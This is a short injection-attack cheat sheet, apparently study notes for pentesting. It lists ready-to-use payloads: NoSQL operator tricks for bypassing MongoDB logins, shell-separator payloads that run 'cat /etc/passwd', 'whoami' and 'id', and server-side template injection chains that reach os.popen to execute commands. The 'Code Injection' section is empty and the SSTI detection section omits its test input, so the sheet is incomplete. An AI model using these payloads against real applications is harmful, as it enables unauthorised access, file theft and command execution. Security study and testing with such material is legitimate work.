========================================
INJECTION ATTACKS CHEATSHEET
(NoSQL + Command + Code + SSTI)
========================================

[HOW TO IDENTIFY]
- User input processed by backend
- Errors / strange behavior
- JSON input / system commands / templates

========================================
💉 NOSQL INJECTION
========================================

[WHERE]
- JSON login forms
- MongoDB-based apps

[Basic Payloads]
{"username":"admin","password":{"$ne":""}}
{"username":{"$ne":null},"password":{"$ne":null}}

[Bypass Login]
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$ne":"wrong"}}

[Operators]
$ne → not equal
$gt → greater than
$lt → less than

[URL Format]
username[$ne]=admin&password[$ne]=123

========================================
💻 COMMAND INJECTION
========================================

[WHERE]
- Input used in system commands (ping, ls, etc.)

[Basic Payloads]
; ls
&& ls
| ls

[Read Files]
; cat /etc/passwd
&& cat /etc/passwd

[System Info]
; whoami
; id

[Windows]
& dir
& whoami

[Bypass Filters]
;ls
&&ls
|ls

========================================
🧠 CODE INJECTION
========================================

[WHERE]

[Python Context]

========================================
🔥 SSTI (VERY IMPORTANT)
========================================

[HOW TO DETECT]

→ Output: 49 → vulnerable

[Basic Payloads]

${7*7}
<%= 7*7 %>

[Template Engines]

Twig: {{7*7}}
ERB: <%= 7*7 %>

[Read Files]
{{config.items()}}
{{self.__init__.__globals__}}

[Command Execution (Advanced)]
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('ls').read()}}
